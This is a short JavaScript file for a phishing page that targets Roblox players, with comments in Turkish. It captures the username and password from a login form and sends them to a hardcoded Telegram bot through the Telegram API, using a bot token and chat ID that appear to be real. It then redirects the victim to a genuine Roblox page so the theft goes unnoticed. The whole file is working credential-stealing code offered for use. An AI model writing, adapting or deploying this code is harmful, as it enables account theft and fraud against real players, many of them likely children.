// Kesinleşmiş ve Doğrulanmış Bilgiler
const token = "8587670631:AAGkVl-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; // Son attığın doğru token
const chatID = "8512406356"; // Senin Chat ID'n

document.getElementById('xf').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const u = document.getElementById('u').value;
    const p = document.getElementById('p').value;
    
    const mesaj = `🎯 ROBUX GANİMETİ DÜŞTÜ!\n\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}`;
    
    // Telegram API İsteği
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(mesaj)}`;

    fetch(url, { mode: 'no-cors' }) // Tarayıcı engelini aşmak için no-cors ekledik
    .then(() => {
        // Bilgi gittikten sonra kurbanı inandırıcı bir yere yolla
        window.location.replace("https://www.roblox.com/promocodes");
    })
    .catch(() => {
        window.location.replace("https://www.roblox.com/login");
    });
});
